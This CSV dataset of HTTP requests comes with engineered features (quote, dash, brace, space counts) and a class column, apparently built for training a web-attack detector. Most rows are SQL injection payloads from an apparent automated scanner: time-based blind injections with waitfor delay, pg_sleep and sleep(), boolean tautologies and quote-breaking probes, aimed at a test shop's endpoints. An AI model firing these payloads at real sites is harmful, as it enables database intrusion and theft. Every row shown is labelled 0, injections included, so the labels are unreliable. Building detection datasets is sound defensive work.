method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,"b""/comment.php?aid=1&pid=0LIYuEz5'));%20waitfor%20delay%20'0:0:6'%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',3,0,1,0,8,2,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*//""",b'',2,2,0,15,0,9,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1',b'',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1'%20OR%202%2b759-759-1%3d0%2b0%2b0%2b1%20or%20'zdBvF1l4'%3d'&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",4,0,0,0,6,0,0
GET,"b""/hpp/index.php?pp=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
POST,b'/guestbook.php',b'name=1&text=-1%20OR%203*2<(0%2b5%2b49-49)%20--%20',0,0,1,1,4,0,0
POST,b'/comment.php?aid=1&pid=-1;select%20pg_sleep(9);%20--%20',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,1,1,6,2,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203*2%3d5%20AND%20616%3d616',0,0,0,0,4,0,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/-1;%20waitfor%20delay%20'0:0:9'%20--%20/""",b'',2,0,1,0,5,2,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%22%20OR%202%2b721-721-1%3d0%2b0%2b0%2b1%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,1,1,0,6,0,0
GET,"b""/hpp/index.php?pp=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/""",b'',2,2,0,15,0,9,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203*2%3d6%20AND%20616%3d616',0,0,0,0,4,0,0
POST,b'/comment.php?aid=1&pid=-1);select%20pg_sleep(9);%20--%20',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,1,1,6,2,0
POST,b'/guestbook.php',b'name=1&text=-1%20OR%203*2>(0%2b5%2b49-49)%20--%20',0,0,1,1,4,0,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/-1);%20waitfor%20delay%20'0:0:9'%20--%20/""",b'',2,0,1,0,5,2,0
GET,b'/product.php?pic=2%20AND%202%2b1-1-1%3d1%20AND%20913%3d913',b'',0,0,0,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=jwVhzqFr',b'',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%22%20OR%203%2b721-721-1%3d0%2b0%2b0%2b1%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,1,1,0,6,0,0
GET,"b""/hpp/index.php?pp=-1;%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/guestbook.php',b'name=1&text=-1%20OR%202%2b287-287-1%3d0%2b0%2b0%2b1',0,0,0,0,2,0,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203*2*0%3d6%20AND%20616%3d616',0,0,0,0,4,0,0
POST,b'/comment.php?aid=1&pid=-1));select%20pg_sleep(3);%20--%20',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,1,1,6,2,0
GET,b'/product.php?pic=2%20AND%203%2b1-1-1%3d1%20AND%20913%3d913',b'',0,0,0,0,4,0,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/-1));%20waitfor%20delay%20'0:0:3'%20--%20/""",b'',2,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=0%2b0%2b0%2b1',b'',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%22%20OR%203*2<(0%2b5%2b721-721)%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,1,1,1,6,0,0
GET,"b""/hpp/index.php?pp=-1);%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203*2*1%3d6%20AND%20616%3d616',0,0,0,0,4,0,0
POST,b'/guestbook.php',"b""name=1&text=-1'%20OR%202%2b361-361-1%3d0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,0,0
POST,"b""/comment.php?aid=1&pid=Jf0NybZY';select%20pg_sleep(3);%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',1,0,1,1,6,2,0
GET,b'/product.php?pic=2%20AND%203*2%3d5%20AND%20913%3d913',b'',0,0,0,0,4,0,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/1%20waitfor%20delay%20'0:0:3'%20--%20/""",b'',2,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=0%2b741*736%2b1',b'',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%22%20OR%203*2>(0%2b5%2b721-721)%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,1,1,1,6,0,0
GET,"b""/hpp/index.php?pp=-1));%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/guestbook.php',"b""name=1&text=-1'%20OR%203%2b361-361-1%3d0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,0,0
POST,"b""/comment.php?aid=1&pid=H3upZt1P');select%20pg_sleep(6);%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',1,0,1,1,6,2,0
GET,"b""/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1ACUSTART'%22zvuUyACUEND""",b'',1,1,0,0,0,0,0
GET,b'/product.php?pic=2%20AND%203*2%3d6%20AND%20913%3d913',b'',0,0,0,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=11-5-2-999',b'',0,0,0,0,0,0,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/xCn5Z7EO';%20waitfor%20delay%20'0:0:6'%20--%20/""",b'',3,0,1,0,5,2,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",2,2,0,14,2,3,0
GET,"b""/hpp/index.php?pp=1%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/guestbook.php',"b""name=1&text=-1'%20OR%203*2<(0%2b5%2b361-361)%20--%20""",1,0,1,1,4,0,0
POST,"b""/comment.php?aid=1&pid=hBlqOnyi'));select%20pg_sleep(6);%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',1,0,1,1,6,2,0
GET,b'/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42',b'',0,0,0,0,0,0,0
GET,b'/product.php?pic=2%20AND%203*2*0%3d6%20AND%20913%3d913',b'',0,0,0,0,4,0,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/yb1bOJUo');%20waitfor%20delay%20'0:0:9'%20--%20/""",b'',3,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=11-5-2-3',b'',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",2,2,0,15,2,9,0
POST,b'/guestbook.php',"b""name=1&text=-1'%20OR%203*2>(0%2b5%2b361-361)%20--%20""",1,0,1,1,4,0,0
GET,"b""/secured/phpinfo.php?=1ACUSTART'%22w2koRACUEND""",b'',1,1,0,0,0,0,0
GET,"b""/hpp/index.php?pp=2vUD8yVH';%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
GET,b'/product.php?pic=2%20AND%203*2*1%3d6%20AND%20913%3d913',b'',0,0,0,0,4,0,0
GET,"b""/listproducts.php?cat=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/t5mBQJFH'));%20waitfor%20delay%20'0:0:9'%20--%20/""",b'',3,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=11-2*5%2b0%2b0%2b1-1',b'',0,0,0,0,0,0,0
POST,"b""/search.php?test=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/""",b'goButton=go&searchFor=',2,2,0,15,0,9,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=1%20waitfor%20delay%20'0:0:9'%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",2,0,1,0,7,2,0
POST,b'/guestbook.php',"b""name=1&text=-1'%20OR%202%2b302-302-1%3d0%2b0%2b0%2b1%20or%20'9heKHpHZ'%3d'""",4,0,0,0,4,0,0
GET,"b""/hpp/index.php?pp=DSoZ7YxN');%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
GET,b'/secured/phpinfo.php?=1ACUSTART%20ACUEND',b'',0,0,0,0,1,0,0
GET,b'/secured/phpinfo.php?=vhLYlo1F',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/-1;select%20pg_sleep(3);%20--%20/',b'',0,0,1,1,3,2,0
GET,b'/listproducts.php?artist=3',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=11-2*6%2b0%2b0%2b1-1',b'',0,0,0,0,0,0,0
GET,"b""/listproducts.php?cat=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
POST,b'/guestbook.php',b'name=1&text=-1%22%20OR%202%2b626-626-1%3d0%2b0%2b0%2b1%20--%20',0,1,1,0,4,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=MlWcw2zI';%20waitfor%20delay%20'0:0:3'%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",3,0,1,0,7,2,0
GET,"b""/hpp/index.php?pp=LNqxcRr9'));%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,0
GET,b'/secured/phpinfo.php?=1ACUSTART%5c',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/-1);select%20pg_sleep(3);%20--%20/',b'',0,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1%20AND%202%2b1-1-1%3d1%20AND%20741%3d741',b'',0,0,0,0,4,0,0
GET,b'/secured/phpinfo.php?=-1%20OR%202%2b603-603-1%3d0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,0
POST,b'/guestbook.php',b'name=1&text=-1%22%20OR%203%2b626-626-1%3d0%2b0%2b0%2b1%20--%20',0,1,1,0,4,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=0hj5BAfL');%20waitfor%20delay%20'0:0:3'%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",3,0,1,0,7,2,0
GET,"b""/listproducts.php?artist=1ACUSTART'%22oPagdACUEND""",b'',1,1,0,0,0,0,0
GET,b'/hpp/index.php?pp=-1;select%20pg_sleep(3);%20--%20',b'',0,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/-1));select%20pg_sleep(6);%20--%20/',b'',0,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1%20AND%203%2b1-1-1%3d1%20AND%20741%3d741',b'',0,0,0,0,4,0,0
GET,b'/listproducts.php?artist=ZsDFnZpm',b'',0,0,0,0,0,0,0
GET,b'/secured/phpinfo.php?=-1%20OR%202%2b311-311-1%3d0%2b0%2b0%2b1',b'',0,0,0,0,2,0,0
POST,b'/guestbook.php',b'name=1&text=-1%22%20OR%203*2<(0%2b5%2b626-626)%20--%20',0,1,1,1,4,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=CSG4vzHt'));%20waitfor%20delay%20'0:0:6'%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",3,0,1,0,7,2,0
GET,b'/hpp/index.php?pp=-1);select%20pg_sleep(6);%20--%20',b'',0,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=1',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1%20AND%203*2%3d5%20AND%20741%3d741',b'',0,0,0,0,4,0,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/kgVqorYo';select%20pg_sleep(6);%20--%20/""",b'',1,0,1,1,3,2,0
GET,b'/listproducts.php?artist=0%2b0%2b0%2b3',b'',0,0,0,0,0,0,0
POST,b'/guestbook.php',b'name=1&text=-1%22%20OR%203*2>(0%2b5%2b626-626)%20--%20',0,1,1,1,4,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=jIfztCfp';select%20pg_sleep(6);%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,1,5,2,0
GET,"b""/secured/phpinfo.php?=-1'%20OR%202%2b456-456-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
GET,b'/hpp/index.php?pp=-1));select%20pg_sleep(6);%20--%20',b'',0,0,1,1,3,2,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/WTcZRV2X');select%20pg_sleep(9);%20--%20/""",b'',1,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1%20AND%203*2%3d6%20AND%20741%3d741',b'',0,0,0,0,4,0,0
GET,b'/listproducts.php?artist=0%2b850*845%2b3',b'',0,0,0,0,0,0,0
POST,b'/guestbook.php',"b""name=1&text=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/""",2,2,0,14,0,3,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=G6gD5I2T');select%20pg_sleep(9);%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,1,5,2,0
GET,"b""/hpp/index.php?pp=aPnWHX5k';select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,0
GET,"b""/secured/phpinfo.php?=-1'%20OR%202%2b859-859-1%3d0%2b0%2b0%2b1%20or%20'WL5MtXln'%3d'""",b'',4,0,0,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=6pg3kLJ6',b'',0,0,0,0,0,0,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/W29pFssp'));select%20pg_sleep(9);%20--%20/""",b'',1,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1%20AND%203*2*0%3d6%20AND%20741%3d741',b'',0,0,0,0,4,0,0
POST,b'/guestbook.php',"b""name=1&text=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/""",2,2,0,15,0,9,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=WMkS3IWl'));select%20pg_sleep(9);%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,1,5,2,0
GET,"b""/hpp/index.php?pp=5PLCwmJX');select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
GET,"b""/listproducts.php?cat=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=0%2b0%2b0%2b1',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/3/',b'',0,0,0,0,0,0,0
GET,b'/secured/phpinfo.php?=-1%22%20OR%202%2b562-562-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1%20AND%203*2*1%3d6%20AND%20741%3d741',b'',0,0,0,0,4,0,0
GET,b'/listproducts.php?artist=0%2b498*493%2b3',b'',0,0,0,0,0,0,0
POST,b'/guestbook.php',"b""name=1&text=-1;%20waitfor%20delay%20'0:0:3'%20--%20""",2,0,1,0,5,2,0
GET,"b""/hpp/index.php?pp=7h2n80D1'));select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%2524%2524w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,0,0,2,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=0%2b243*238%2b1',b'',0,0,0,0,0,0,0
GET,"b""/secured/phpinfo.php?=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
POST,b'/guestbook.php',"b""name=1&text=-1);%20waitfor%20delay%20'0:0:3'%20--%20""",2,0,1,0,5,2,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/3/?id=1ACUSTART'%22hK5uoACUEND""",b'',1,1,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=11-5-2-999',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/Cu1dEFEO/',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=0%2b600*595%2b1',b'',0,0,0,0,0,0,0
GET,"b""/secured/phpinfo.php?=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/""",b'',2,2,0,15,0,9,0
GET,b'/listproducts.php?artist=0%2b491*486%2b3',b'',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=EDtnyqrq&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,0,0,2,0,0
POST,b'/guestbook.php',"b""name=1&text=-1));%20waitfor%20delay%20'0:0:6'%20--%20""",2,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/RateProduct-2.html?id=1',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=11-5-2-3',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/0%2b0%2b0%2b3/',b'',0,0,0,0,0,0,0
POST,"b""/search.php?test=(select(0)from(select(sleep(0)))v)/*'%2b(select(0)from(select(sleep(0)))v)%2b'%22%2b(select(0)from(select(sleep(0)))v)%2b%22*/""",b'goButton=go&searchFor=',2,2,0,15,0,9,0
GET,"b""/secured/phpinfo.php?=1%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/guestbook.php',"b""name=1&text=1%20waitfor%20delay%20'0:0:6'%20--%20""",2,0,1,0,5,2,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=-1%20OR%202%2b637-637-1%3d0%2b0%2b0%2b1%20--%20&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,1,0,6,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=11-2*5%2b0%2b0%2b1-1',b'',0,0,0,0,0,0,0
POST,"b""/search.php?test=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/""",b'goButton=go&searchFor=',2,2,0,15,0,9,0
GET,"b""/secured/phpinfo.php?=f8Gd0HDY';%20waitfor%20delay%20'0:0:6'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/guestbook.php',"b""name=1&text=XQuQauHl';%20waitfor%20delay%20'0:0:6'%20--%20""",3,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/RateProduct-2.html?id=XkFA9aal',b'',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=-1%20OR%202%2b605-605-1%3d0%2b0%2b0%2b1&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,0,0,4,0,0
GET,b'/listproducts.php?artist=0%2b261*256%2b3',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=11-2*6%2b0%2b0%2b1-1',b'',0,0,0,0,0,0,0
GET,"b""/secured/phpinfo.php?=li0zF3Vp');%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/guestbook.php',"b""name=1&text=HSRdlm7X');%20waitfor%20delay%20'0:0:9'%20--%20""",3,0,1,0,5,2,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=-1'%20OR%202%2b505-505-1%3d0%2b0%2b0%2b1%20--%20&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,0,6,0,0
GET,b'/Mod_Rewrite_Shop/RateProduct-2.html?id=0%2b0%2b0%2b1',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=1%20AND%202%2b1-1-1%3d1%20AND%20243%3d243',b'',0,0,0,0,4,0,0
GET,"b""/listproducts.php?artist=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
POST,b'/guestbook.php',"b""name=1&text=pjC0WyY9'));%20waitfor%20delay%20'0:0:9'%20--%20""",3,0,1,0,5,2,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=-1'%20OR%202%2b434-434-1%3d0%2b0%2b0%2b1%20or%20'UZdXWCam'%3d'&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",4,0,0,0,6,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=1%20AND%203%2b1-1-1%3d1%20AND%20243%3d243',b'',0,0,0,0,4,0,0
GET,b'/Mod_Rewrite_Shop/RateProduct-2.html?id=0%2b347*342%2b1',b'',0,0,0,0,0,0,0
GET,"b""/secured/phpinfo.php?=NcmYCN56'));%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/guestbook.php',b'name=1&text=-1;select%20pg_sleep(9);%20--%20',0,0,1,1,3,2,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=-1%22%20OR%202%2b818-818-1%3d0%2b0%2b0%2b1%20--%20&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,1,1,0,6,0,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1%20AND%202%2b1-1-1%3d1%20AND%20600%3d600',b'',0,0,0,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=1%20AND%203*2%3d5%20AND%20243%3d243',b'',0,0,0,0,4,0,0
GET,"b""/secured/phpinfo.php?=0YgbIedL';select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/?id=1%20AND%203*2%3d6%20AND%20243%3d243',b'',0,0,0,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=1%20AND%203%2b1-1-1%3d1%20AND%20600%3d600',b'',0,0,0,0,4,0,0
